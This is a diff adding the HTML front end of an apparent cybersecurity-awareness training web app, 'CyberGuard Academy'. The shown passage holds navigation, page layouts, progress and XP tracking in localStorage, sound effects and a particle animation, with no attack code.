@@ -1,0 +1,2275 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CyberGuard Academy | Learn. Detect. Defend.</title>
+  <!-- SEO Meta Tags -->
+  <meta name="description" content="Master cybersecurity awareness through interactive browser-safe simulations. Experience phishing, SQL injection, XSS, and more behind-the-scenes.">
+  <meta name="author" content="CyberGuard Academy">
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            cyberBg: '#0B1020',
+            cyberPrimary: '#00E5FF',
+            cyberSecondary: '#00FF99',
+            cyberAccent: '#7C3AED',
+            cyberDanger: '#FF4D4D',
+          },
+          fontFamily: {
+            sans: ['Outfit', 'sans-serif'],
+            mono: ['Share Tech Mono', 'monospace'],
+          }
+        }
+      }
+    }
+  </script>
+  <!-- Custom Stylesheet -->
+  <link rel="stylesheet" href="style.css">
+  <!-- Lucide Icons CDN -->
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <style>
+    @keyframes fadeInStep {
+      from { opacity: 0; transform: translateY(8px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body class="bg-cyberBg text-slate-100 min-h-full flex flex-col cyber-grid relative scanlines">
+
+  <!-- Background Canvas for Particles -->
+  <canvas id="particles-canvas"></canvas>
+
+  <!-- Navigation Bar -->
+  <nav class="sticky top-0 z-50 glass-panel border-b border-cyan-500/10 px-4 py-3 flex items-center justify-between">
+    <div class="flex items-center space-x-3 cursor-pointer" onclick="navigateTo('home')">
+      <div class="w-10 h-10 rounded-lg bg-gradient-to-br from-cyberPrimary to-cyberAccent flex items-center justify-center glow-primary">
+        <i data-lucide="shield-alert" class="w-6 h-6 text-slate-900 stroke-[2.5]"></i>
+      </div>
+      <div>
+        <h1 class="text-lg font-bold text-glow-cyan text-transparent bg-clip-text bg-gradient-to-r from-cyberPrimary to-white">CyberGuard Academy</h1>
+        <p class="text-[10px] tracking-widest text-cyberSecondary uppercase font-mono">Learn. Detect. Defend.</p>
+      </div>
+    </div>
+
+    <!-- Nav Links -->
+    <div class="hidden md:flex items-center space-x-8 text-sm font-semibold">
+      <button onclick="navigateTo('home')" class="nav-link text-cyberPrimary border-b-2 border-cyberPrimary pb-1 transition duration-300">Home</button>
+      <button onclick="navigateTo('simulations')" class="nav-link text-slate-400 hover:text-cyberPrimary pb-1 transition duration-300">Simulations</button>
+      <button onclick="navigateTo('progress')" class="nav-link text-slate-400 hover:text-cyberPrimary pb-1 transition duration-300">Progress</button>
+      <button onclick="navigateTo('profile')" class="nav-link text-slate-400 hover:text-cyberPrimary pb-1 transition duration-300">Profile</button>
+      <button onclick="navigateTo('settings')" class="nav-link text-slate-400 hover:text-cyberPrimary pb-1 transition duration-300">Settings</button>
+    </div>
+
+    <!-- User Badge -->
+    <div class="flex items-center space-x-3">
+      <div class="bg-slate-900/80 px-3 py-1.5 rounded-full border border-cyberPrimary/20 flex items-center space-x-2 font-mono text-xs">
+        <span class="text-cyberPrimary">XP:</span>
+        <span id="nav-xp" class="text-white font-bold">0</span>
+      </div>
+      <div class="w-8 h-8 rounded-full bg-cyberAccent flex items-center justify-center font-bold text-xs border border-cyberAccent/50 cursor-pointer" onclick="navigateTo('profile')">
+        <span id="nav-avatar">CG</span>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Mobile Navigation Bar (Bottom) -->
+  <div class="md:hidden fixed bottom-0 left-0 right-0 z-50 glass-panel border-t border-cyan-500/10 flex justify-around py-2.5">
+    <button onclick="navigateTo('home')" class="flex flex-col items-center text-xs text-cyberPrimary">
+      <i data-lucide="home" class="w-5 h-5 mb-0.5"></i>
+      <span>Home</span>
+    </button>
+    <button onclick="navigateTo('simulations')" class="flex flex-col items-center text-xs text-slate-400">
+      <i data-lucide="terminal" class="w-5 h-5 mb-0.5"></i>
+      <span>Sims</span>
+    </button>
+    <button onclick="navigateTo('progress')" class="flex flex-col items-center text-xs text-slate-400">
+      <i data-lucide="trending-up" class="w-5 h-5 mb-0.5"></i>
+      <span>Progress</span>
+    </button>
+    <button onclick="navigateTo('profile')" class="flex flex-col items-center text-xs text-slate-400">
+      <i data-lucide="user" class="w-5 h-5 mb-0.5"></i>
+      <span>Profile</span>
+    </button>
+    <button onclick="navigateTo('settings')" class="flex flex-col items-center text-xs text-slate-400">
+      <i data-lucide="settings" class="w-5 h-5 mb-0.5"></i>
+      <span>Settings</span>
+    </button>
+  </div>
+
+  <!-- Main Content Container -->
+  <main class="flex-grow pb-20 md:pb-8 max-w-7xl mx-auto w-full px-4 relative z-10">
+
+    <!-- PAGE: HOME -->
+    <section id="page-home" class="py-12 space-y-12">
+      <!-- Hero -->
+      <div class="text-center max-w-3xl mx-auto space-y-6">
+        <div class="inline-flex items-center space-x-2 px-3 py-1 rounded-full bg-cyan-500/10 border border-cyberPrimary/30 text-cyberPrimary text-xs font-mono">
+          <span class="w-2 h-2 rounded-full bg-cyberPrimary animate-ping"></span>
+          <span>CYBER DEFENSE SYSTEM ONLINE</span>
+        </div>
+        <h1 class="text-4xl md:text-6xl font-extrabold tracking-tight leading-tight">
+          Master the Cyber Arena<br>
+          <span class="text-transparent bg-clip-text bg-gradient-to-r from-cyberPrimary via-cyan-400 to-cyberSecondary text-glow-cyan">Through Safe Simulations</span>
+        </h1>
+        <p class="text-slate-400 text-sm md:text-lg max-w-2xl mx-auto">
+          Experience real-world security vulnerabilities from both angles. Interact with realistic layouts, understand what occurs behind the scenes, and defend against threats.
+        </p>
+        <div>
+          <button onclick="navigateTo('simulations')" class="bg-gradient-to-r from-cyberPrimary to-cyberSecondary text-slate-950 font-bold px-8 py-3 rounded-lg hover:brightness-110 shadow-lg hover:shadow-cyan-500/20 transition-all duration-300 font-mono tracking-wide transform hover:scale-105">
+            START LEARNING NOW
+          </button>
+        </div>
+      </div>
+
+      <!-- Feature Grid -->
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-5xl mx-auto">
+        <div class="glass-card p-6 rounded-xl flex items-start space-x-4">
+          <div class="w-12 h-12 rounded-lg bg-cyberPrimary/10 flex items-center justify-center border border-cyberPrimary/20 flex-shrink-0">
+            <i data-lucide="play" class="w-6 h-6 text-cyberPrimary"></i>
+          </div>
+          <div>
+            <h3 class="text-base font-bold text-white mb-1">Interactive Scenarios</h3>
+            <p class="text-slate-400 text-xs leading-relaxed">Operate mock user profiles, check emails, view fake pages, and test inputs in safe containers.</p>
+          </div>
+        </div>
+        <div class="glass-card p-6 rounded-xl flex items-start space-x-4">
+          <div class="w-12 h-12 rounded-lg bg-cyberSecondary/10 flex items-center justify-center border border-cyberSecondary/20 flex-shrink-0">
+            <i data-lucide="eye" class="w-6 h-6 text-cyberSecondary"></i>
+          </div>
+          <div>
+            <h3 class="text-base font-bold text-white mb-1">Behind The Scenes</h3>
+            <p class="text-slate-400 text-xs leading-relaxed">Observe graphical pipeline animations showing packets, cookies, and database operations during threats.</p>
+          </div>
+        </div>
+        <div class="glass-card p-6 rounded-xl flex items-start space-x-4">
+          <div class="w-12 h-12 rounded-lg bg-cyberAccent/10 flex items-center justify-center border border-cyberAccent/20 flex-shrink-0">
+            <i data-lucide="award" class="w-6 h-6 text-cyberAccent"></i>
+          </div>
+          <div>
+            <h3 class="text-base font-bold text-white mb-1">Earn Achievements</h3>
+            <p class="text-slate-400 text-xs leading-relaxed">Complete levels, select correct mitigation techniques, earn XP, and unlock rank certifications.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- PAGE: SIMULATIONS -->
+    <section id="page-simulations" class="py-8 hidden space-y-6">
+      <div class="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 border-b border-slate-800 pb-4">
+        <div>
+          <h2 class="text-2xl font-bold text-white flex items-center">
+            <i data-lucide="terminal" class="w-6 h-6 text-cyberPrimary mr-2"></i>
+            Simulation Matrix
+          </h2>
+          <p class="text-xs text-slate-400">Select any of the 40 simulation nodes to launch interactive training modules.</p>
+        </div>
+        <!-- Search & Filter -->
+        <div class="flex flex-wrap items-center gap-2 w-full md:w-auto">
+          <input type="text" id="sim-search" placeholder="Search simulations..." oninput="filterSimulations()" class="bg-slate-900 border border-slate-750 text-xs px-3 py-2 rounded-lg text-slate-200 focus:outline-none focus:border-cyberPrimary w-full md:w-48">
+          <select id="sim-difficulty" onchange="filterSimulations()" class="bg-slate-900 border border-slate-750 text-xs px-3 py-2 rounded-lg text-slate-200 focus:outline-none focus:border-cyberPrimary">
+            <option value="all">All Difficulties</option>
+            <option value="Beginner">Beginner</option>
+            <option value="Intermediate">Intermediate</option>
+            <option value="Advanced">Advanced</option>
+          </select>
+        </div>
+      </div>
+
+      <!-- Simulation Cards Grid -->
+      <div id="simulations-grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
+        <!-- Rendered dynamically -->
+      </div>
+    </section>
+
+    <!-- PAGE: ARENA (ACTIVE SIMULATION) -->
+    <section id="page-arena" class="py-6 hidden flex flex-col space-y-6">
+      <!-- Active Simulation Header -->
+      <div class="glass-card p-4 rounded-xl border border-cyberPrimary/20 flex flex-col md:flex-row md:items-center justify-between gap-4">
+        <div class="flex items-center space-x-3">
+          <button onclick="navigateTo('simulations')" class="p-2 bg-slate-900/80 rounded-lg hover:bg-slate-800 border border-slate-700 text-slate-400 hover:text-white transition">
+            <i data-lucide="arrow-left" class="w-5 h-5"></i>
+          </button>
+          <div>
+            <h2 id="arena-title" class="text-xl font-bold text-white">Simulation Title</h2>
+            <div class="flex items-center space-x-3 mt-1 text-xs">
+              <span id="arena-difficulty" class="px-2.5 py-0.5 rounded font-semibold text-[10px]">Beginner</span>
+              <span class="text-slate-400 flex items-center"><i data-lucide="clock" class="w-3.5 h-3.5 mr-1"></i> <span id="arena-time">3 mins</span></span>
+              <span class="text-cyberPrimary flex items-center font-mono font-bold"><i data-lucide="zap" class="w-3.5 h-3.5 mr-1"></i> <span id="arena-xp">150</span> XP</span>
+            </div>
+          </div>
+        </div>
+        
+        <!-- Simulation Progress -->
+        <div class="flex-1 max-w-xs space-y-1 md:text-right">
+          <div class="text-[10px] text-slate-400 font-mono">SIMULATION STEPS</div>
+          <div class="w-full bg-slate-800 rounded-full h-2 overflow-hidden border border-slate-700">
+            <div id="arena-progress-bar" class="bg-gradient-to-r from-cyberPrimary to-cyberSecondary h-full w-[33%] transition-all duration-500"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Goal Alert -->
+      <div class="bg-cyan-950/20 border border-cyberPrimary/20 p-3 rounded-lg flex items-start space-x-3 text-xs text-cyan-300">
+        <i data-lucide="info" class="w-4 h-4 mt-0.5 text-cyberPrimary flex-shrink-0"></i>
+        <div>
+          <span class="font-bold">Learning Goal:</span> <span id="arena-goal">Understand what to verify.</span>
+        </div>
+      </div>
+
+      <!-- Two-Window Sandbox Workspace -->
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 min-h-[480px]">
+        <!-- LEFT WINDOW: User Screen -->
+        <div class="glass-card rounded-xl border border-slate-800 overflow-hidden flex flex-col">
+          <div class="bg-slate-900/90 px-4 py-2 border-b border-slate-800 flex justify-between items-center text-xs">
+            <span class="font-bold text-slate-300 flex items-center"><i data-lucide="monitor" class="w-4 h-4 mr-1 text-cyberPrimary"></i> User Sandbox Screen</span>
+            <span class="text-[10px] text-slate-500 font-mono">SAFE EMULATION</span>
+          </div>
+          <div id="arena-left-container" class="flex-grow p-4 bg-slate-950/50">
+            <!-- Dynamic left screen content -->
+          </div>
+        </div>
+
+        <!-- RIGHT WINDOW: Behind the Scene -->
+        <div class="glass-card rounded-xl border border-slate-800 overflow-hidden flex flex-col">
+          <div class="bg-slate-900/90 px-4 py-2 border-b border-slate-800 flex justify-between items-center text-xs">
+            <span class="font-bold text-slate-300 flex items-center"><i data-lucide="activity" class="w-4 h-4 mr-1 text-cyberSecondary"></i> Behind the Scenes flow</span>
+            <span class="text-[10px] text-slate-500 font-mono">THREAT PROCESSOR</span>
+          </div>
+          <div id="arena-right-container" class="flex-grow bg-slate-950/30">
+            <!-- Dynamic right flow content -->
+          </div>
+        </div>
+      </div>
+
+      <!-- Decision Panel -->
+      <div class="glass-card p-5 rounded-xl border border-slate-850 space-y-4">
+        <div>
+          <h3 class="text-xs font-bold font-mono text-cyberPrimary tracking-wider uppercase">Make Your Decision</h3>
+          <p id="arena-step-desc" class="text-sm text-slate-300 mt-1">Review the sandbox data and click the most secure response action.</p>
+        </div>
+
+        <!-- Choices Layout -->
+        <div id="arena-choices-container" class="grid grid-cols-1 md:grid-cols-3 gap-3">
+          <!-- Dynamic choice buttons -->
+        </div>
+
+        <!-- Choice Feedback Panel -->
+        <div id="arena-feedback-panel" class="hidden p-4 rounded-lg border text-xs">
+          <!-- Rendered dynamically -->
+        </div>
+      </div>
+    </section>
+
+    <!-- PAGE: PROGRESS -->
+    <section id="page-progress" class="py-8 hidden space-y-8">
+      <div>
+        <h2 class="text-2xl font-bold text-white flex items-center">
+          <i data-lucide="trending-up" class="w-6 h-6 text-cyberPrimary mr-2"></i>
+          Your Security Progress
+        </h2>
+        <p class="text-xs text-slate-400">Inspect your XP earnings, simulation achievements, and statistics metrics.</p>
+      </div>
+
+      <!-- Stats Grid -->
+      <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+        <div class="glass-card p-4 rounded-xl border border-slate-800 text-center">
+          <div class="text-2xl font-bold text-cyberPrimary font-mono" id="stat-completed">0/40</div>
+          <div class="text-[10px] text-slate-400 uppercase mt-1">Completed Modules</div>
+        </div>
+        <div class="glass-card p-4 rounded-xl border border-slate-800 text-center">
+          <div class="text-2xl font-bold text-cyberSecondary font-mono" id="stat-xp">0</div>
+          <div class="text-[10px] text-slate-400 uppercase mt-1">Total XP Earned</div>
+        </div>
+        <div class="glass-card p-4 rounded-xl border border-slate-800 text-center">
+          <div class="text-2xl font-bold text-cyberAccent font-mono" id="stat-accuracy">0%</div>
+          <div class="text-[10px] text-slate-400 uppercase mt-1">Accuracy Rate</div>
+        </div>
+        <div class="glass-card p-4 rounded-xl border border-slate-800 text-center">
+          <div class="text-2xl font-bold text-cyberDanger font-mono" id="stat-rank">Analyst</div>
+          <div class="text-[10px] text-slate-400 uppercase mt-1">Academy Rank</div>
+        </div>
+      </div>
+
+      <!-- Completed History List -->
+      <div class="glass-card p-5 rounded-xl border border-slate-800 space-y-4">
+        <h3 class="text-sm font-bold text-white font-mono uppercase tracking-wider">Completed Node Registry</h3>
+        <div class="overflow-x-auto">
+          <table class="w-full text-left text-xs border-collapse">
+            <thead>
+              <tr class="border-b border-slate-800 text-slate-400">
+                <th class="py-2.5">Simulation Name</th>
+                <th class="py-2.5">Difficulty</th>
+                <th class="py-2.5">Date Completed</th>
+                <th class="py-2.5 text-right">Stars</th>
+              </tr>
+            </thead>
+            <tbody id="progress-history-tbody">
+              <!-- Rendered dynamically -->
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <!-- PAGE: PROFILE -->
+    <section id="page-profile" class="py-8 hidden space-y-8">
+      <div>
+        <h2 class="text-2xl font-bold text-white flex items-center">
+          <i data-lucide="user" class="w-6 h-6 text-cyberPrimary mr-2"></i>
+          Academy Profile
+        </h2>
+        <p class="text-xs text-slate-400">Customise your rank name, review credentials, and check awards.</p>
+      </div>
+
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+        <!-- Left Block: Card -->
+        <div class="glass-card p-6 rounded-xl border border-slate-800 flex flex-col items-center text-center space-y-4">
+          <!-- Avatar wrapper -->
+          <div class="relative w-28 h-28 rounded-full bg-cyberAccent/20 flex items-center justify-center border-2 border-cyberAccent glow-accent">
+            <span id="profile-avatar-display" class="text-3xl font-extrabold text-white">CG</span>
+          </div>
+          
+          <div class="w-full space-y-2">
+            <div class="flex items-center justify-center space-x-2">
+              <input type="text" id="profile-username" value="Agent Zoro" class="bg-slate-900 border border-slate-750 text-sm font-bold px-3 py-1.5 rounded-lg text-center text-white focus:outline-none focus:border-cyberPrimary w-44">
+              <button onclick="saveUsername()" class="p-2 bg-slate-800 rounded-lg border border-slate-700 text-cyberSecondary hover:bg-slate-700 transition">
+                <i data-lucide="save" class="w-4 h-4"></i>
+              </button>
+            </div>
+            <div class="text-xs text-slate-400" id="profile-rank-display font-mono">Rank: Security Analyst</div>
+          </div>
+        </div>
+
+        <!-- Middle Block: Progress Circle -->
+        <div class="glass-card p-6 rounded-xl border border-slate-800 flex flex-col items-center justify-center text-center">
+          <h3 class="text-xs font-bold font-mono text-cyberPrimary uppercase tracking-wider mb-4">Rank Completion Ratio</h3>
+          <div class="relative w-36 h-36">
+            <svg class="w-full h-full transform -rotate-90" viewBox="0 0 100 100">
+              <circle cx="50" cy="50" r="40" stroke="rgba(255,255,255,0.03)" stroke-width="8" fill="transparent"></circle>
+              <circle id="profile-svg-circle" cx="50" cy="50" r="40" stroke="#00FF99" stroke-width="8" fill="transparent" stroke-dasharray="251.2" stroke-dashoffset="251.2" class="transition-all duration-1000 ease-out"></circle>
+            </svg>
+            <div class="absolute inset-0 flex flex-col items-center justify-center">
+              <span id="profile-ratio-text" class="text-xl font-bold font-mono text-white">0%</span>
+              <span class="text-[9px] text-slate-400">Total Progress</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Right Block: Achievements -->
+        <div class="glass-card p-6 rounded-xl border border-slate-800 space-y-4">
+          <h3 class="text-xs font-bold font-mono text-cyberPrimary uppercase tracking-wider">Achievements List</h3>
+          <div class="grid grid-cols-2 gap-3" id="achievements-container">
+            <!-- Rendered dynamically -->
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- PAGE: SETTINGS -->
+    <section id="page-settings" class="py-8 hidden space-y-8">
+      <div>
+        <h2 class="text-2xl font-bold text-white flex items-center">
+          <i data-lucide="settings" class="w-6 h-6 text-cyberPrimary mr-2"></i>
+          Control Settings
+        </h2>
+        <p class="text-xs text-slate-400">Tune sound effects, UI themes, or reset simulation data progress.</p>
+      </div>
+
+      <div class="max-w-xl glass-card p-6 rounded-xl border border-slate-800 space-y-6">
+        <!-- Sound Effect Toggle -->
+        <div class="flex items-center justify-between pb-4 border-b border-slate-800">
+          <div>
+            <h3 class="text-sm font-bold text-white">Mock Sound FX Alerts</h3>
+            <p class="text-xs text-slate-400">Simulate browser beeps, typing clicks, and warnings during plays.</p>
+          </div>
+          <button id="btn-toggle-sound" onclick="toggleSound()" class="px-4 py-1.5 rounded-lg bg-cyberPrimary text-slate-950 font-bold text-xs font-mono">ENABLED</button>
+        </div>
+
+        <!-- High Contrast Mode -->
+        <div class="flex items-center justify-between pb-4 border-b border-slate-800">
+          <div>
+            <h3 class="text-sm font-bold text-white">Maximum Neon Borders</h3>
+            <p class="text-xs text-slate-400">Increase outer styling container glow indicators for visibility.</p>
+          </div>
+          <button id="btn-toggle-neon" onclick="toggleNeonGlow()" class="px-4 py-1.5 rounded-lg bg-cyberPrimary text-slate-950 font-bold text-xs font-mono">ENABLED</button>
+        </div>
+
+        <!-- Reset All Progress -->
+        <div class="flex items-center justify-between pt-2">
+          <div>
+            <h3 class="text-sm font-bold text-red-400">Factory Reset Progress</h3>
+            <p class="text-xs text-slate-400">Clears registry records, total XP, achievements, and statistics from LocalStorage.</p>
+          </div>
+          <button onclick="openResetModal()" class="bg-red-950 hover:bg-red-900 border border-red-800 text-red-400 px-4 py-2 rounded-lg text-xs font-semibold">RESET DATA</button>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- MODAL: SIMULATION COMPLETION -->
+  <div id="completion-modal" class="fixed inset-0 z-[100] bg-slate-950/80 backdrop-blur-md hidden items-center justify-center p-4">
+    <div class="glass-card max-w-lg w-full p-6 rounded-2xl border border-cyberSecondary/30 modal-enter space-y-6 text-center">
+      
+      <!-- Stars & Celebration -->
+      <div class="space-y-2">
+        <div class="flex justify-center space-x-2 text-2xl text-slate-700" id="completion-stars">
+          <i data-lucide="star" class="w-8 h-8 fill-current text-slate-700"></i>
+          <i data-lucide="star" class="w-8 h-8 fill-current text-slate-700"></i>
+          <i data-lucide="star" class="w-8 h-8 fill-current text-slate-700"></i>
+        </div>
+        <h3 class="text-2xl font-extrabold text-glow-green text-transparent bg-clip-text bg-gradient-to-r from-cyberSecondary to-white">MODULE SECURED!</h3>
+        <p class="text-xs text-slate-400 font-mono uppercase tracking-widest">Threat Terminated Successfully</p>
+      </div>
+
+      <!-- Stats Gained -->
+      <div class="grid grid-cols-2 gap-4 bg-slate-900/60 p-4 rounded-xl border border-slate-800">
+        <div>
+          <div class="text-[10px] text-slate-400 uppercase">XP Awarded</div>
+          <div class="text-lg font-bold text-cyberSecondary font-mono" id="comp-xp-gained">+0 XP</div>
+        </div>
+        <div>
+          <div class="text-[10px] text-slate-400 uppercase">Correct Choices</div>
+          <div class="text-lg font-bold text-cyberPrimary font-mono" id="comp-choices-gained">0/0</div>
+        </div>
+      </div>
+
+      <!-- Summary Panel -->
+      <div class="text-left space-y-2">
+        <h4 class="text-xs font-bold text-white font-mono uppercase tracking-wider">Executive Threat Summary</h4>
+        <p id="comp-summary-desc" class="text-xs text-slate-400 leading-relaxed bg-slate-950 p-3 rounded-lg border border-slate-900">
+          The threat was analysed and successfully mitigated. Refer to rules below.
+        </p>
+      </div>
+
+      <!-- Key Actionable Tips -->
+      <div class="text-left space-y-2">
+        <h4 class="text-xs font-bold text-white font-mono uppercase tracking-wider">Defense Protocols Checklist</h4>
+        <ul id="comp-tips-list" class="list-disc pl-4 text-xs text-slate-300 space-y-1">
+          <!-- Rendered dynamically -->
+        </ul>
+      </div>
+
+      <!-- Action buttons -->
+      <div class="flex space-x-3 pt-2">
+        <button onclick="closeCompletionModal()" class="flex-1 bg-slate-800 hover:bg-slate-700 border border-slate-700 py-2.5 rounded-lg text-xs font-semibold">Return to Matrix</button>
+        <button id="btn-next-sim" class="flex-1 bg-gradient-to-r from-cyberPrimary to-cyberSecondary text-slate-950 font-bold py-2.5 rounded-lg text-xs tracking-wide">Launch Next Module</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODAL: CONFIRM RESET -->
+  <div id="reset-modal" class="fixed inset-0 z-[100] bg-slate-950/80 backdrop-blur-md hidden items-center justify-center p-4">
+    <div class="glass-card max-w-sm w-full p-6 rounded-xl border border-red-500/30 text-center space-y-5">
+      <div class="w-12 h-12 rounded-full bg-red-950/40 border border-red-500 flex items-center justify-center mx-auto text-red-500 font-bold text-xl">⚠️</div>
+      <div>
+        <h3 class="text-base font-bold text-white">Confirm Factory Reset?</h3>
+        <p class="text-xs text-slate-400 mt-1">This operation deletes all accomplishments, rank progression, and profiles from local database store. Action is irreversible.</p>
+      </div>
+      <div class="flex space-x-3">
+        <button onclick="closeResetModal()" class="flex-1 bg-slate-800 hover:bg-slate-700 border border-slate-700 py-2 rounded text-xs">Cancel</button>
+        <button onclick="confirmReset()" class="flex-1 bg-red-600 hover:bg-red-500 py-2 rounded text-xs font-bold text-white">RESET ALL</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Mock Web Audio Helper -->
+  <script>
+    // System settings state loaded from LocalStorage
+    let soundEnabled = localStorage.getItem('sound_enabled') !== 'false';
+    let neonGlowEnabled = localStorage.getItem('neon_glow') !== 'false';
+    
+    // Simple synthesized beeps using Web Audio API
+    function playBeep(type) {
+      if (!soundEnabled) return;
+      try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = audioCtx.createOscillator();
+        const gainNode = audioCtx.createGain();
+        
+        oscillator.connect(gainNode);
+        gainNode.connect(audioCtx.destination);
+        
+        if (type === 'success') {
+          oscillator.type = 'sine';
+          oscillator.frequency.setValueAtTime(587.33, audioCtx.currentTime); // D5
+          oscillator.frequency.setValueAtTime(880, audioCtx.currentTime + 0.1); // A5
+          gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
+          gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
+          oscillator.start();
+          oscillator.stop(audioCtx.currentTime + 0.3);
+        } else if (type === 'fail') {
+          oscillator.type = 'sawtooth';
+          oscillator.frequency.setValueAtTime(220, audioCtx.currentTime); // A3
+          oscillator.frequency.setValueAtTime(110, audioCtx.currentTime + 0.15); // A2
+          gainNode.gain.setValueAtTime(0.15, audioCtx.currentTime);
+          gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
+          oscillator.start();
+          oscillator.stop(audioCtx.currentTime + 0.4);
+        } else { // default click
+          oscillator.type = 'sine';
+          oscillator.frequency.setValueAtTime(800, audioCtx.currentTime);
+          gainNode.gain.setValueAtTime(0.05, audioCtx.currentTime);
+          gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.08);
+          oscillator.start();
+          oscillator.stop(audioCtx.currentTime + 0.08);
+        }
+      } catch (e) {
+        console.log("Audio not supported or blocked");
+      }
+    }
+  </script>
+
+  <!-- Core Simulations JS Data link -->
+  <script src="simulations.js"></script>
+
+  <!-- Main Controller Application -->
+  <script>
+    // State Variables
+    let userStats = {
+      username: "Agent Zoro",
+      xp: 0,
+      completedList: [], // array of objects {id, date, stars, score}
+      historyAnswers: [] // logs of correct/incorrect choices
+    };
+
+    let activeSim = null;
+    let activeStepIndex = 0;
+    let simChoicesLog = []; // track correct answers for active sim
+
+    // Initialize application on DOM load
+    window.addEventListener('DOMContentLoaded', () => {
+      loadStatsFromStorage();
+      navigateTo('home');
+      initParticles();
+      renderSimulationsGrid();
+      updateUIElements();
+      
+      // Initialise system settings buttons UI
+      document.getElementById('btn-toggle-sound').textContent = soundEnabled ? 'ENABLED' : 'DISABLED';
+      document.getElementById('btn-toggle-sound').className = soundEnabled ? 'px-4 py-1.5 rounded-lg bg-cyberSecondary text-slate-950 font-bold text-xs font-mono' : 'px-4 py-1.5 rounded-lg bg-slate-800 text-slate-400 font-bold text-xs font-mono';
+      
+      document.getElementById('btn-toggle-neon').textContent = neonGlowEnabled ? 'ENABLED' : 'DISABLED';
+      document.getElementById('btn-toggle-neon').className = neonGlowEnabled ? 'px-4 py-1.5 rounded-lg bg-cyberSecondary text-slate-950 font-bold text-xs font-mono' : 'px-4 py-1.5 rounded-lg bg-slate-800 text-slate-400 font-bold text-xs font-mono';
+      
+      applyNeonGlowStyle();
+    });
+
+    // Particle Flow Animation Logic
+    function initParticles() {
+      const canvas = document.getElementById('particles-canvas');
+      const ctx = canvas.getContext('2d');
+      let particlesArray = [];
+      const numberOfParticles = 40;
+
+      function resizeCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+      }
+      window.addEventListener('resize', resizeCanvas);
+      resizeCanvas();
+
+      class Particle {
+        constructor() {
+          this.x = Math.random() * canvas.width;
+          this.y = Math.random() * canvas.height;
+          this.size = Math.random() * 1.5 + 0.5;
+          this.speedX = Math.random() * 0.4 - 0.2;
+          this.speedY = Math.random() * 0.4 - 0.2;
+          this.color = Math.random() > 0.5 ? 'rgba(0, 229, 255, 0.15)' : 'rgba(0, 255, 153, 0.1)';
+        }
+        update() {
+          this.x += this.speedX;
+          this.y += this.speedY;
+          if (this.x < 0 || this.x > canvas.width) this.speedX = -this.speedX;
+          if (this.y < 0 || this.y > canvas.height) this.speedY = -this.speedY;
+        }
+        draw() {
+          ctx.fillStyle = this.color;
+          ctx.beginPath();
+          ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+          ctx.fill();
+        }
+      }
+
+      for (let i = 0; i < numberOfParticles; i++) {
+        particlesArray.push(new Particle());
+      }
+
+      function animate() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        for (let i = 0; i < particlesArray.length; i++) {
+          particlesArray[i].update();
+          particlesArray[i].draw();
+        }
+        requestAnimationFrame(animate);
+      }
+      animate();
+    }
+
+    // Local Storage Actions
+    function loadStatsFromStorage() {
+      const saved = localStorage.getItem('cyberguard_stats_v2');
+      if (saved) {
+        try {
+          userStats = JSON.parse(saved);
+          if (!userStats.historyAnswers) userStats.historyAnswers = [];
+        } catch (e) {
+          console.error("Failed to parse statistics", e);
+        }
+      }
+      updateUIElements();
+    }
+
+    function saveStatsToStorage() {
+      localStorage.setItem('cyberguard_stats_v2', JSON.stringify(userStats));
+      updateUIElements();
+    }
+
+    // UI Updates
+    function updateUIElements() {
+      document.getElementById('nav-xp').textContent = userStats.xp;
+      document.getElementById('stat-xp').textContent = userStats.xp;
+      
+      const avatarLetters = userStats.username ? userStats.username.split(" ").map(n => n[0]).join("").substring(0,2).toUpperCase() : "CG";
+      document.getElementById('nav-avatar').textContent = avatarLetters;
+      document.getElementById('profile-avatar-display').textContent = avatarLetters;
+      document.getElementById('profile-username').value = userStats.username;
+      
+      const completedCount = userStats.completedList.length;
+      document.getElementById('stat-completed').textContent = `${completedCount}/40`;
+      
+      // Calculate rank
+      let rank = "Apprentice";
+      if (userStats.xp >= 2500) rank = "Elite Guardian";
+      else if (userStats.xp >= 1500) rank = "Security Inspector";
+      else if (userStats.xp >= 600) rank = "Security Analyst";
+      document.getElementById('stat-rank').textContent = rank;
+      const rankDisplay = document.getElementById('profile-rank-display font-mono');
+      if (rankDisplay) rankDisplay.textContent = `Rank: ${rank}`;
+
+      // Calculate accuracy
+      let accuracy = 0;
+      if (userStats.historyAnswers.length > 0) {
+        const correctCount = userStats.historyAnswers.filter(a => a.correct).length;
+        accuracy = Math.round((correctCount / userStats.historyAnswers.length) * 100);
+      }
+      document.getElementById('stat-accuracy').textContent = `${accuracy}%`;
+
+      // Update Profile SVG Circle
+      const progressPercent = Math.min((completedCount / 40) * 100, 100);
